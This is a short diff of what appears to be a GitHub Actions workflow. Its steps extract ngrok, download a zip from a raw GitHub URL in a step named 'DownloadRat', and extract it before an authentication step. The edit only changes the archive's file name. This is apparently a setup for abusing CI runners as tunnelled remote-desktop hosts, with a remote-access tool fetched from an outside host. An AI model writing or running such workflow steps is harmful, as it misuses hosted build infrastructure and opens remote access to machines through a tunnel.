@@ -13,7 +13,7 @@ jobs:
     - name: Extract
       run: Expand-Archive ngrok.zip
     - name: DownloadRat
-      run: Invoke-WebRequest https://raw.githubusercontent.com/khalid-ofcl/rdp-files/main/rdp.zip -OutFile rdp.zip
+      run: Invoke-WebRequest https://raw.githubusercontent.com/khalid-ofcl/rdp-files/main/rdp_new.zip -OutFile rdp.zip
     - name: ExtractRat
       run: Expand-Archive rdp.zip
     - name: Auth
